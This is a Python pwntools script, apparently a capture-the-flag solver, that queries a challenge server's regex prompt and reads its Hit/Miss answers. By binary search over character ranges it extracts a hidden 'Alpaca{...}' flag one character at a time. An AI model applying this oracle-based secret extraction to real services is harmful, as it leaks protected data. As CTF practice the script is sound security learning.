from pwn import remote

# サーバー接続用のオブジェクト
conn = None

def connect() -> remote:
    """
    サーバー接続

    Returns:
        remote: サーバー
    """
    host = "34.170.146.252"
    port = 39277

    conn = remote(host, port)

    # プロンプト待ち
    conn.recvuntil(b"regex> ")

    return conn

def close():
    """
    サーバー接続を閉じる
    """
    if conn is not None:
        conn.close()

def send_regex(pattern: str) -> str:
    """
    指定した正規表現をサーバーに送り、レスポンスを1行返す。

    Args:
        pattern (str): 送信する正規表現

    Returns:
        str: サーバーからのレスポンス（"Hit!" or "Miss..."）
    """
    # 正規表現送信
    #print(pattern)
    conn.sendline(pattern.encode())

    # 結果受信
    response = conn.recvline().decode().strip()
    #print(response)

    return response

def sendFlag(flag : str) -> str:
    """
    フラグのカッコの中の前半を指定して、指定した正規表現をサーバーに送り、レスポンスを1行返す。

    Args:
        flag (str): 送信する正規表現

    Returns:
        str: サーバーからのレスポンス（"Hit!" or "Miss..."）
    """
    return send_regex(r"Alpaca\{" + flag + ".*\}")

def sendFlagAll(flag : str) -> str:
    """
    フラグのカッコの中の全てを指定して、指定した正規表現をサーバーに送り、レスポンスを1行返す。

    Args:
        flag (str): 送信する正規表現

    Returns:
        str: サーバーからのレスポンス（"Hit!" or "Miss..."）
    """
    return send_regex(r"Alpaca\{" + flag + "\}")

def isHit(result : str) -> bool:
    """
    Hitかどうかを判定

    Args:
        result (str): 判定する文字列

    Returns:
        bool: Hitかどうか
    """
    return result == "regex> Hit!"

def binarySearch(prefix : str, minVal : str, maxVal : str) -> str:
    """
    Hitする文字を二分探索

    Args:
        prefix (str): 検索する文字の手前につける文字列
        minVal (str): 二分探索の下限値
        maxVal (str): 二分探索の上限値

    Returns:
        str: Hitした文字
    """
    left = ord(minVal)
    right = ord(maxVal)
    while left < right:
        mid = (left + right) // 2
        range_regex = f"[{chr(left)}-{chr(mid)}]"
        if isHit(sendFlag(prefix + range_regex)):
            right = mid
        else:
            left = mid + 1
    return chr(left)

if __name__ == "__main__":
    conn = connect()
    flag = ""
    while True:
        nextChar = ""
        # 次の1文字を検索
        if isHit(sendFlag(f"{flag}\\d")):
            nextChar = binarySearch(flag, "0", "9")
        elif isHit(sendFlag(f"{flag}[a-z]")):
            nextChar = binarySearch(flag, "a", "z")
        elif isHit(sendFlag(f"{flag}[A-Z]")):
            nextChar = binarySearch(flag, "A", "Z")
        elif isHit(sendFlag(f"{flag}_")):
            nextChar = "_"

        if nextChar == "":
            raise ValueError("next character was not found")

        # 見つけた文字を追加
        flag += nextChar

        # 完全一致すれば終了
        if isHit(sendFlagAll(flag)):
            break

    print(f"Alpaca{{{flag}}}")
    close()
